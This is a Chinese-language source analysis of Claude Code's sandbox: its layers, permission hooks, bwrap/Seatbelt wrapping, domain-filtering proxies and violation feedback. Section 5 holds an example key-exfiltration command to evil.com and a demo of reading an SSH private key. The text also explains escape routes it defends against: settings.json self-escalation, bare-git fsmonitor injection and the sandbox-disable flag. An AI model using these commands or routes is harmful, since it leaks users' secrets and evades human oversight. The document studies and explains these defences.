# Claude code 沙箱实现分析

## 一、沙箱在 Claude Code 里到底是什么

很多人以为 Claude Code 的"沙箱"是某种自研的 JS 虚拟机或 VM。**实际上它是一个 OS 级进程沙箱**——只用来包裹 Bash/PowerShell 真正要 `spawn` 出去的命令进程，**对工具调用本身（FileEdit/FileRead/WebFetch 等）不做包裹**，那些工具的安全是靠"权限层"（见 `docs/security-architecture.md` 我之前整理过的 7 层架构）来管的。

技术栈一句话总结：

| 层 | 实现 |
|---|---|
| 操作系统原语 | macOS 用 `sandbox-exec`（Seatbelt），Linux/WSL2 用 `bubblewrap (bwrap)` + seccomp + network namespace |
| 网络隔离 | 本地起 HTTP/SOCKS 代理进程做域名白名单过滤；macOS 还有 `log monitor` 抓违规 |
| 运行时包 | 外部 NPM 包 `@anthropic-ai/sandbox-runtime`（项目里只看得到 import，源码不在仓库内） |
| Claude Code 适配 | `src/utils/sandbox/sandbox-adapter.ts` 的 `SandboxManager` |
| 触发点 | `src/utils/Shell.ts` 的 `exec()` 在 spawn 前调用 `SandboxManager.wrapWithSandbox()` 把命令字符串"包"一层 |

---

## 二、整体架构图

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                          Claude Code 沙箱整体架构                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Layer A：配置源 (输入)                                                       │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │  userSettings   projectSettings   localSettings   flagSettings          │ │
│  │  policySettings(企业MDM)          --add-dir       会话期 /sandbox 命令   │ │
│  │  ─────────────────────────────────────────────────────────────────────  │ │
│  │  关键键：                                                                │ │
│  │    sandbox.enabled / failIfUnavailable / enabledPlatforms               │ │
│  │    sandbox.autoAllowBashIfSandboxed                                     │ │
│  │    sandbox.allowUnsandboxedCommands                                     │ │
│  │    sandbox.filesystem.{allowWrite,denyWrite,allowRead,denyRead}         │ │
│  │    sandbox.network.{allowedDomains,allowManagedDomainsOnly,             │ │
│  │                     allowUnixSockets,httpProxyPort,socksProxyPort}      │ │
│  │    sandbox.excludedCommands  (非安全边界，仅便利)                        │ │
│  │    sandbox.ignoreViolations                                             │ │
│  │    permissions.allow/deny (会被翻译成沙箱规则)                           │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                       │                                      │
│                                       ▼                                      │
│  Layer B：适配/翻译层  src/utils/sandbox/sandbox-adapter.ts                   │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │  convertToSandboxRuntimeConfig(settings) ── 把 CC 配置 → 沙箱配置        │ │
│  │  ┌────────────────────────────────────────────────────────────────────┐ │ │
│  │  │ • Edit(...)  allow/deny  → fs.allowWrite / denyWrite                │ │ │
│  │  │ • Read(...)  deny        → fs.denyRead                              │ │ │
│  │  │ • WebFetch(domain:...)   → network.allowedDomains/deniedDomains     │ │ │
│  │  │ • permissions.additionalDirectories → fs.allowWrite                 │ │ │
│  │  │ • CC 路径语法 //abs、/相对 settings 目录   → 实路径                  │ │ │
│  │  │ • 始终强制 denyWrite：                                              │ │ │
│  │  │     - 所有 settings.json 文件 (防沙箱逃逸)                          │ │ │
│  │  │     - .claude/skills/  .claude/commands/  .claude/agents/           │ │ │
│  │  │     - bare-git 文件 HEAD/objects/refs/hooks/config (防 git 逃逸)    │ │ │
│  │  │ • git worktree 主仓库路径自动加入 allowWrite                         │ │ │
│  │  │ • 内置 ripgrep 路径注入                                              │ │ │
│  │  └────────────────────────────────────────────────────────────────────┘ │ │
│  │                                                                         │ │
│  │  SandboxManager (单例) 暴露的能力：                                       │ │
│  │   ┌──────────────────────────┐   ┌──────────────────────────┐         │ │
│  │   │ initialize(askCallback)  │   │ wrapWithSandbox(cmd,sh)  │         │ │
│  │   │ refreshConfig() 热更新   │   │ cleanupAfterCommand()    │         │ │
│  │   │ isSandboxingEnabled()    │   │ annotateStderrWith…()    │         │ │
│  │   │ checkDependencies()      │   │ getSandboxViolationStore │         │ │
│  │   │ isSupportedPlatform()    │   │ scrubBareGitRepoFiles()  │         │ │
│  │   └──────────────────────────┘   └──────────────────────────┘         │ │
│  │                                                                         │ │
│  │  settingsChangeDetector.subscribe(updateConfig)  ◄── 设置改了即时生效   │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                       │                                      │
│                                       ▼                                      │
│  Layer C：使用判定层  src/tools/BashTool/shouldUseSandbox.ts                  │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │  shouldUseSandbox(input) → boolean                                      │ │
│  │   ├ SandboxManager.isSandboxingEnabled()?         否 → false            │ │
│  │   ├ input.dangerouslyDisableSandbox && allowed?   是 → false (走外部)   │ │
│  │   ├ input.command 为空?                            是 → false            │ │
│  │   └ containsExcludedCommand(command)?              是 → false (白名单)   │ │
│  │                                                    否 → true             │ │
│  │                                                                         │ │
│  │  containsExcludedCommand 用 splitCommand 拆子命令逐个匹配，              │ │
│  │  并对每个子命令做 stripAllLeadingEnvVars / stripSafeWrappers 多轮剥离，  │ │
│  │  防止 `FOO=bar timeout 30 bazel ...` 这类绕过                            │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                       │                                      │
│                                       ▼                                      │
│  Layer D：与权限层的协同  src/utils/permissions/permissions.ts                │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │  hasPermissionsToUseToolInner() 里两个关键沙箱钩子：                     │ │
│  │   1b. 全工具 ask 规则命中时：                                            │ │
│  │       如果 sandboxing + autoAllowBashIfSandboxed + shouldUseSandbox     │ │
│  │       → 跳过 ask，走 tool.checkPermissions 让沙箱自动 allow              │ │
│  │   tool.checkPermissions (Bash) → checkSandboxAutoAllow                  │ │
│  │       → "Auto-allowed with sandbox (autoAllowBashIfSandboxed enabled)" │ │
│  │                                                                         │ │
│  │  PermissionDecisionReason.type = 'sandboxOverride'                      │ │
│  │       reason: 'excludedCommand' | 'dangerouslyDisableSandbox'           │ │
│  │       → 文案 "Run outside of the sandbox" 提示用户                      │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                       │                                      │
│                                       ▼                                      │
│  Layer E：命令包装与执行  src/utils/Shell.ts: exec()                          │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │  await provider.buildExecCommand(cmd, { useSandbox })                   │ │
│  │     → 注入 cwd 跟踪、$TMPDIR=/tmp/claude-<uid>/ 等                       │ │
│  │  if (shouldUseSandbox) {                                                │ │
│  │     commandString = await SandboxManager.wrapWithSandbox(               │ │
│  │         commandString, binShell, undefined, abortSignal);               │ │
│  │     mkdir(sandboxTmpDir, mode: 0o700);                                  │ │
│  │  }                                                                      │ │
│  │  spawn(binShell, ['-c', commandString], {env, cwd, stdio:文件fd})        │ │
│  │  .then(result => {                                                       │ │
│  │     if (shouldUseSandbox) SandboxManager.cleanupAfterCommand();         │ │
│  │     // → 同时调用 scrubBareGitRepoFiles() 清理被植入的 .git 文件        │ │
│  │  })                                                                      │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                       │                                      │
│                                       ▼                                      │
│  Layer F：操作系统沙箱原语  @anthropic-ai/sandbox-runtime                     │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │  macOS                       │  Linux / WSL2                            │ │
│  │  ───────────────────────────────────────────────────────────────────    │ │
│  │  sandbox-exec -p '<profile>' │  bwrap                                   │ │
│  │  + Seatbelt 规则             │   --ro-bind / --bind / --tmpfs           │ │
│  │  + log monitor 抓违规        │   --unshare-net + seccomp BPF            │ │
│  │  + trustd 可选 (TLS MITM)    │   /dev/null mount 拒绝写非存在路径       │ │
│  │                              │                                          │ │
│  │  两边共享：                                                             │ │
│  │   • 内嵌 HTTP 代理 (httpProxyPort)：按 allowedDomains 过滤              │ │
│  │   • 内嵌 SOCKS 代理 (socksProxyPort)                                    │ │
│  │   • 违规事件 → SandboxViolationStore                                    │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                       │                                      │
│                                       ▼                                      │
│  Layer G：违规反馈环  (闭环回到 LLM)                                          │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │  SandboxViolationStore 收集 fs/network 违规事件                          │ │
│  │  → annotateStderrWithSandboxFailures(cmd, stdout)                       │ │
│  │     在输出末尾插入 <sandbox_violations>…</sandbox_violations>            │ │
│  │  → tool_result 回灌给 LLM                                                │ │
│  │  → LLM 看到违规，决定：                                                  │ │
│  │     a) 用 dangerouslyDisableSandbox 重试 (会触发权限弹窗)                │ │
│  │     b) 调整命令避开受限路径/网络                                          │ │
│  │     c) 引导用户用 /sandbox 命令改配置                                    │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## 三、工作流程图（一次 Bash 工具调用的完整生命周期）

```
                    用户提问  "看看 src 目录有哪些文件"
                                 │
                                 ▼
                         LLM 生成 tool_use:
                         { name: "Bash",
                           input: { command: "ls -la src/" } }
                                 │
                                 ▼
   ┌─────────────────────────────────────────────────────────┐
   │ ① 权限层 (Layer 1~5)                                     │
   │  • Zod 校验 / validateInput / Hook 拦截                  │
   │  • 全工具 deny/ask 规则                                  │
   │  • Bash 的 AST + 18 个正则校验 + 子命令拆分              │
   │  ─────────────────────────────────────────────────────── │
   │  关键沙箱钩子 (permissions.ts:1183-1208):                 │
   │   if (askRule 命中) {                                    │
   │     if ( sandboxing                                      │
   │       && autoAllowBashIfSandboxed                        │
   │       && shouldUseSandbox(input) ) {                     │
   │         // 跳过 ask，让沙箱兜底                          │
   │     } else { return ask; }                               │
   │   }                                                      │
   │   tool.checkPermissions (Bash):                          │
   │     checkSandboxAutoAllow → behavior:'allow'             │
   │       reason: "Auto-allowed with sandbox"                │
   └─────────────────────────────────────────────────────────┘
                                 │ allow
                                 ▼
   ┌─────────────────────────────────────────────────────────┐
   │ ② Shell.exec() 入口                                      │
   │   shouldUseSandbox(input) === true                       │
   │   ───────────────────────────────────                    │
   │   sandboxTmpDir = /tmp/claude-<uid>/                     │
   │   buildExecCommand(useSandbox=true):                     │
   │     注入 cwd 跟踪、TMPDIR、cd $cwd 前缀                  │
   │     得到 "cd .../src && ls -la src/ && pwd -P > $cwdFile"│
   └─────────────────────────────────────────────────────────┘
                                 │
                                 ▼
   ┌─────────────────────────────────────────────────────────┐
   │ ③ SandboxManager.wrapWithSandbox(cmd, /bin/bash)         │
   │                                                          │
   │   等待 initialize() Promise (首次会异步建立代理进程)      │
   │   读取当前 config (热更新版本) → 拼装：                  │
   │                                                          │
   │   macOS:                                                 │
   │     sandbox-exec -p '(version 1)                         │
   │       (allow default)                                    │
   │       (deny file-write*)                                 │
   │       (allow file-write* (subpath "."))                  │
   │       (deny file-write* (literal "~/.claude/settings.…   │
   │       (deny network-outbound)                            │
   │       (allow network-outbound (remote tcp "*:443"))      │
   │       ; via httpProxyPort=…                              │
   │     ' /bin/bash -c '<cmd>'                               │
   │                                                          │
   │   Linux:                                                 │
   │     bwrap --ro-bind / /                                  │
   │           --bind $cwd $cwd                               │
   │           --bind $TMPDIR $TMPDIR                         │
   │           --ro-bind ~/.claude/settings.json /…           │
   │           --unshare-net --seccomp <fd>                   │
   │           --setenv HTTP_PROXY 127.0.0.1:PROXY_PORT       │
   │           -- /bin/bash -c '<cmd>'                        │
   └─────────────────────────────────────────────────────────┘
                                 │
                                 ▼
   ┌─────────────────────────────────────────────────────────┐
   │ ④ spawn(binShell, ['-c', wrappedCmd])  ← Node 子进程     │
   │   stdio: 文件 fd (O_APPEND + O_NOFOLLOW 防符号链接攻击)  │
   │   env: SHELL/TMPDIR/CLAUDECODE=1/SESSION_ID              │
   └─────────────────────────────────────────────────────────┘
                                 │
            ┌────────────────────┼────────────────────┐
            ▼                    ▼                    ▼
   命令在沙箱中跑          代理过滤网络         OS 拦截非法系统调用
   (cwd 受 chroot/seatbelt    HTTP/SOCKS         seccomp BPF
    限制；只能写 allowWrite   按域名白名单       (Linux)
    列出的路径)               过滤连接           ─────────────
                              ─────────────      违规 → SIGSYS
                              违规 → 502 + log  
                                 │
                                 ▼
   ┌─────────────────────────────────────────────────────────┐
   │ ⑤ 命令结束 → result                                       │
   │   • SandboxManager.cleanupAfterCommand()                 │
   │     - scrubBareGitRepoFiles(): 删除沙箱内可能写入的       │
   │       HEAD/objects/refs/config 等伪 bare-repo 文件        │
   │     - Linux: 清理 bwrap 留下的 0 字节 mount 文件          │
   │   • 沙箱外的 Claude 进程读取 cwd 跟踪文件，更新会话 cwd   │
   └─────────────────────────────────────────────────────────┘
                                 │
                                 ▼
   ┌─────────────────────────────────────────────────────────┐
   │ ⑥ annotateStderrWithSandboxFailures(cmd, output)         │
   │   从 SandboxViolationStore 查本次 PID/时间窗内的违规     │
   │   如果有 → 在输出尾部追加:                                │
   │   <sandbox_violations>                                   │
   │     Network: blocked connection to evil.com:443          │
   │     Filesystem: write denied at ~/.ssh/id_rsa            │
   │   </sandbox_violations>                                  │
   └─────────────────────────────────────────────────────────┘
                                 │
                                 ▼
                tool_result 返回给 LLM
                LLM 看到违规标签，决定是否重试 / 调整 / 引导用户
```

---

## 四、关键设计要点（源码里看得到的设计哲学）

| 设计点 | 出处 | 解释 |
|--------|------|------|
| **沙箱 ≠ 权限层** | `permissions.ts` 与 `shouldUseSandbox.ts` 解耦 | 权限层负责"该不该让模型做"，沙箱负责"哪怕该做了也只能在笼子里做"。两层都被绕过才算真出问题。 |
| **autoAllowBashIfSandboxed = 易用性 × 安全性的妥协** | `bashPermissions.ts:1349-1358` | 进沙箱的 Bash 命令默认 allow，省得每条都弹窗；但 **deny 规则、ask 规则、safetyCheck 一律仍生效**。 |
| **dangerouslyDisableSandbox 是一次性逃生口** | `processBashCommand.tsx:84`、`prompt.ts:228-256` | LLM 在 prompt 里被反复教育：默认沙箱、看到沙箱型错误才能用、用了也是 per-command 不是 per-session、且策略 (`allowUnsandboxedCommands=false`) 可彻底禁掉这个参数。 |
| **excludedCommands 明确声明不是安全边界** | `shouldUseSandbox.ts:18-20` | "It is not a security bug to be able to bypass excludedCommands"——便利性配置，便于像 `docker`、`bazel` 这种沙箱里跑不通的工具直接走外面，但仍然要过权限层。 |
| **settings.json 强制 denyWrite** | `sandbox-adapter.ts:230-245` | 否则模型在沙箱里写 settings 就能给自己提权——这是沙箱逃逸的经典路径。 |
| **bare-git 防注入** | `sandbox-adapter.ts:256-280, 404-414` | 攻击者在 cwd 植 HEAD+objects+refs+config(fsmonitor) 就能让 Claude 进程外的 git 调用执行任意命令；所以沙箱跑完后 `scrubBareGitRepoFiles()` 主动删一遍。 |
| **failIfUnavailable 严格模式** | `sandbox-adapter.ts:479-485` | 企业部署可以要求"沙箱启不起来就直接退出"，避免"我以为开了，其实没开"的安全幻觉。`getSandboxUnavailableReason()` 还会给出可读理由。 |
| **设置热更新** | `sandbox-adapter.ts:776-781` | `settingsChangeDetector.subscribe` → 配置一改立即 `updateConfig`，配合 `refreshConfig()` 同步刷新避免竞态。 |
| **网络分两层** | `sandbox-adapter.ts:359-368` | 内置 HTTP/SOCKS 代理（按域名）+ OS 网络命名空间（unshare-net），代理挂了至少还有 OS 兜底。 |
| **macOS 与 Linux 的差异显式承认** | `sandbox-adapter.ts:597-642`、`prompt.ts:253` | Linux 用 bwrap 不支持 path glob、PowerShell 包装路径要走 `/bin/sh -c` 重新拼装、WSL1 不支持 → 全在适配层抹平。 |

---

## 五、举个通俗的例子：让 Claude 帮你跑 `cat ~/.ssh/id_rsa`

假设你在 macOS 上启用了沙箱（`~/.claude/settings.json` 里 `sandbox.enabled: true, autoAllowBashIfSandboxed: true`），现在你随口对 Claude 说："帮我看一下我的 SSH 私钥长啥样"。

```
┌──────────────────────────────────────────────────────────────────────┐
│ 模型生成的工具调用：                                                  │
│   Bash({ command: "cat ~/.ssh/id_rsa" })                              │
└──────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌──────────────────────────────────────────────────────────────────────┐
│ 第一关：权限层 (人脑代入 → 守门员)                                    │
│   • Zod 校验 OK                                                       │
│   • Bash AST 解析 → SimpleCommand{ name:'cat', args:['~/.ssh/id_rsa']}│
│   • 没有 deny 规则、没有 ask 规则                                     │
│   • sandboxing + autoAllowBashIfSandboxed + shouldUseSandbox = 真    │
│   • Bash.checkPermissions → checkSandboxAutoAllow                    │
│       → allow ("Auto-allowed with sandbox") ✅                       │
│                                                                       │
│   守门员心声："你要进笼子去翻东西？随你便。"                          │
└──────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌──────────────────────────────────────────────────────────────────────┐
│ 第二关：包装  Shell.exec()                                            │
│   原命令：  cat ~/.ssh/id_rsa                                         │
│   包装后：  sandbox-exec -p '<profile>' /bin/bash -c '...cat ~/.ssh/…'│
│   profile 里关键几行：                                                │
│     (deny file-write*)                                                │
│     (allow file-write* (subpath "/Users/me/project"))  ← 当前 cwd     │
│     (allow file-read*)              ← 读默认放行                      │
│     (deny  file-read* (literal "/Users/me/.claude/settings.json"))    │
│     (deny  network-outbound)                                          │
│   注意：~/.ssh/id_rsa 既不在 denyRead 里，也不被特别保护              │
└──────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌──────────────────────────────────────────────────────────────────────┐
│ 第三关：沙箱中执行  sandbox-exec → /bin/bash → cat                    │
│   成功读到 -----BEGIN OPENSSH PRIVATE KEY-----                        │
│   stdout 回到 Claude 进程                                             │
└──────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌──────────────────────────────────────────────────────────────────────┐
│ 结果：私钥被打印到聊天窗口 😱                                          │
└──────────────────────────────────────────────────────────────────────┘
```

**这个例子要说明三件事：**

### 1) 沙箱不是"反窥探"，是"反破坏"

很多人第一反应是"沙箱不应该拦住读私钥吗？"——**默认不会**。Claude Code 的沙箱主打两个目标：

- **写隔离**：模型不能改你电脑上和当前项目无关的东西（防止 `rm -rf ~`、改 `~/.bashrc` 植后门、改 settings.json 给自己提权）。
- **网络隔离**：模型不能往外发数据（防止 `curl -d @id_rsa evil.com`，因为 evil.com 不在 allowedDomains 里，HTTP 代理会拒绝；OS 网络命名空间也阻断）。

**读默认是开放的**——因为代码库里 90% 的有用操作（grep、cat、find、make、npm test）都需要读各种文件，全拦读基本没法用。

### 2) 如果你真在意 SSH 私钥，要靠"配置"明确告诉沙箱

在 `~/.claude/settings.json` 加上：

```json
{
  "permissions": {
    "deny": ["Read(~/.ssh/**)", "Read(~/.aws/**)"]
  },
  "sandbox": {
    "enabled": true,
    "filesystem": {
      "denyRead": ["~/.ssh", "~/.aws", "~/.gnupg"]
    }
  }
}
```

这时再让 Claude 跑 `cat ~/.ssh/id_rsa`，链路会变成：

- **权限层先拦**：`Read(~/.ssh/**)` deny → 权限层直接拒，根本进不到沙箱。
- **就算权限层被绕过**（比如某种新工具忘了走权限层），`sandbox.filesystem.denyRead` 进了 `convertToSandboxRuntimeConfig`，sandbox-exec 在 OS 层把 `cat` 的 `open()` 系统调用拒掉，sandbox-runtime 把"读 ~/.ssh/id_rsa 被拒"写到 `SandboxViolationStore`，最后被 `annotateStderrWithSandboxFailures` 贴回 tool_result，模型看到"哦，沙箱拦了"，会向你解释并停下。

### 3) 这就是"纵深防御"在沙箱场景的体现

权限层（守门员）和沙箱层（笼子）**互不依赖、互相兜底**：

- 守门员漏放了恶意命令 → 笼子兜底（最多在 cwd 里搞破坏 + 没网）。
- 守门员误判了一个合法命令为 ask → 因为命令本来就要进笼子，沙箱兜底自动 allow，省了用户审批（这就是 `autoAllowBashIfSandboxed` 的设计意图）。
- 模型尝试用 `dangerouslyDisableSandbox` 跳出笼子 → **重新激活守门员**，弹一个明确的"Run outside of the sandbox"提示让用户决定。

---

## 六、想自己验证一下的话

把项目里这几个文件读一遍就够了，加起来不到 1500 行：

```99:381:src/utils/sandbox/sandbox-adapter.ts
// resolvePathPatternForSandbox / convertToSandboxRuntimeConfig
// —— 看 Claude Code 配置到 SandboxRuntimeConfig 的全部翻译规则
```

```130:153:src/tools/BashTool/shouldUseSandbox.ts
export function shouldUseSandbox(input: Partial<SandboxInput>): boolean {
  if (!SandboxManager.isSandboxingEnabled()) return false
  if (input.dangerouslyDisableSandbox &&
      SandboxManager.areUnsandboxedCommandsAllowed()) return false
  if (!input.command) return false
  if (containsExcludedCommand(input.command)) return false
  return true
}
```

```256:273:src/utils/Shell.ts
const isSandboxedPowerShell = shouldUseSandbox && shellType === 'powershell'
const sandboxBinShell = isSandboxedPowerShell ? '/bin/sh' : binShell
if (shouldUseSandbox) {
  commandString = await SandboxManager.wrapWithSandbox(
    commandString, sandboxBinShell, undefined, abortSignal,
  )
}
```

```1183:1208:src/utils/permissions/permissions.ts
// 全工具 ask 规则命中时，沙箱可自动放行的逻辑
const canSandboxAutoAllow =
  tool.name === BASH_TOOL_NAME &&
  SandboxManager.isSandboxingEnabled() &&
  SandboxManager.isAutoAllowBashIfSandboxedEnabled() &&
  shouldUseSandbox(input)
```

如果你想继续往下挖，最值得读的是 `convertToSandboxRuntimeConfig` 里 230-280 行那一段——里面藏着两个非常巧妙的安全 trick：**禁写 settings.json 防自我提权** 和 **bare-git 文件 scrub 防 git fsmonitor 逃逸**。这两个都是真实 issue（`#29316`、`#30067`）打出来的补丁，工业级安全工程的味道很浓。